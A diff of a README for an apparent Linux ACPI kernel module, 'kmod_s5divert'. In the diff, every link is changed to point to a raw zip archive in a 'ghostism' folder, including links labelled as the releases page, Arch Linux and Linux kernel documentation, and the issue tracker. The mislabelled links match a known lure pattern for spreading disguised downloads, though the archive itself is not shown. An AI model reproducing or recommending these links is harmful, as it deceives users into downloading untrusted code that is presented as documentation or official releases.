@@ -6,11 +6,11 @@ Welcome to the kmod_s5divert repository! This software helps control your system
 
 ## 📥 Download the Application
 
-[![Download kmod_s5divert](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip%20kmod_s5divert-%https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)
+[![Download kmod_s5divert](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip%20kmod_s5divert-%https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)
 
 You can find the latest version of kmod_s5divert on GitHub Releases. This link will take you to the download page:
 
-[Visit this page to download](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)
 
 ## 📦 System Requirements
 
@@ -34,7 +34,7 @@ This application offers several benefits:
 
 To install kmod_s5divert, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip).
 2. **Choose the Version**: Find the latest version available.
 3. **Download the Package**: Click on the link for the appropriate package that matches your system.
 4. **Install the Module**:
@@ -91,8 +91,8 @@ Use this command to see any kernel messages related to the module.
 
 For more detailed information on ACPI kernel modules and general power management in Linux, check the following resources:
 
-- [Arch Linux Kernel Module Documentation](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)
-- [Linux Kernel Documentation](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)
+- [Arch Linux Kernel Module Documentation](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)
+- [Linux Kernel Documentation](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)
 
 ## 💬 Community Support
 
@@ -100,7 +100,7 @@ If you need further assistance or wish to share your experience, join our commun
 
 ## 🔗 Important Links
 
-- [Download kmod_s5divert](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/kmod_s5divert_fitfulness.zip)
+- [Download kmod_s5divert](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Suraj74287428/kmod_s5divert/main/ghostism/s_kmod_divert_v1.0.zip)
 
 Thank you for using kmod_s5divert!
